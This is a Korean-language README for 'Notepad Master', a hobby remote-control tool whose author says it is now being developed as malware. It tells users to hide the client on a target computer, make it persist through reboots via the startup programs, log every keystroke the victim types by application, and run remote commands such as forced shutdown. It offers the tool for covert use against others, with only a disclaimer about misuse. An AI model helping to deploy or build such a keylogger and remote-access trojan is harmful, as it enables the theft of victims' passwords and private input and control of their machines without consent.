What is Notepad Master?
==========================
컴퓨터실 장난용 원격조종 툴로 시작했으나

지금은 악성코드를 방향성으로 잡고 개발하고 있습니다

악용시 책임은 당사자가 집니다

Setup
=======================

조종 타겟 컴퓨터에서 NotepadMaster.zip을 다운받아 클라이언트(NotepadMasterClient.exe)를 잘 숨겨줍니다

Install.exe로 설치 과정을 거칩니다

`IP 입력`

서버(NotepadMasterServer.exe)가 실행될 컴퓨터의 IP주소를 입력합니다

`시작프로그램으로 등록하시겠습니까?`

등록하는 경우 윈도우의 시작프로그램으로서 재부팅 시에도 실행이 유지됩니다

y또는 n을 입력합니다

관리자 권한으로 실행해야 쓸 수 있는 기능입니다

`실행파일 경로 입력`

시작프로그램으로 등록하는 경우 실행파일의 전체 경로를 제공해야합니다

![실행파일 경로 설정](https://user-images.githubusercontent.com/67177785/227840930-e49617ea-bc5b-49f7-9142-2996b2a2a3d4.png)  
**[그림1] 실행파일 경로 설정**

클라이언트 실행파일의 이름을 경로를 포함해 입력해줍니다

이후 클라이언트를 실행해 작동시킵니다

![클라이언트 접속 확인](https://user-images.githubusercontent.com/67177785/188458759-82e23583-14c0-4ff6-94c7-739688aba460.PNG)  
**[그림2] 클라이언트 접속 확인**

설치 과정에 문제가 없었다면 서버에서 접속자의 정보들을 리스트로 확인 할 수 있습니다

리스트에 올라있는 클라이언트의 번호를 더블클릭해 원격 조종 창을 띄울 수 있습니다

Keylog
=================

![키로깅 확인](https://user-images.githubusercontent.com/67177785/188458781-3536b79a-50cf-4651-a20b-6353ee96b9e7.gif)  
**[그림3] 키로깅 확인**

조종 타겟이 키보드를 누를 때마다 입력 정보를 전송합니다(키로깅).

키로그를 키가 입력된 프로세스로 구분해 어떤 프로그램에 키가 입력되었는지 알 수 있고

한글 / 영어 둘 다 지원합니다

키로그 모두 저장 버튼으로 받은 키로그들을 저장합니다.

Send Message
========================

![메시지 전송 예시](https://user-images.githubusercontent.com/67177785/188458806-006505b2-9cd6-452a-999d-9050e3a3a41c.gif)  
**[그림4] 메시지 전송 예시**

메모장을 통해 타겟에게 일방적으로 메시지를 전달합니다.

메시지 입력창 위쪽에서 폰트를 바꿀 수 있습니다.

딜레이 값을 통해 글자 입력 속도를 조절합니다.

글자 크기는 21, 딜레이는 120이 기본 값입니다.

Remote Control
========================

![커맨드 입력 예시](https://user-images.githubusercontent.com/67177785/188458834-6caa6be6-a38c-422b-b619-06c2a2cc9a69.gif)  
**[그림5] 커맨드 입력 예시**

CMD 옵션을 선택해 타겟 컴퓨터에 원격으로 윈도우 커맨드를 입력할 수 있습니다

아래는 유용하게 쓸 수 있는 커맨드 입력 예시입니다.

```
start chrome youtube.com // 유튜브 틀어주기
taskkill /f /im notepad.exe // 메모장 강제종료
shutdown -s // 시스템 강제종료
```

Build Settings
==========================

### IDE
- Visual Studio 2017

### Framework
- MFC

License
==========================
This project is licensed under the terms of GPL-3.0 License.

Icon License : <a href='https://pngtree.com/so/puppet'>puppet png from pngtree.com/</a>
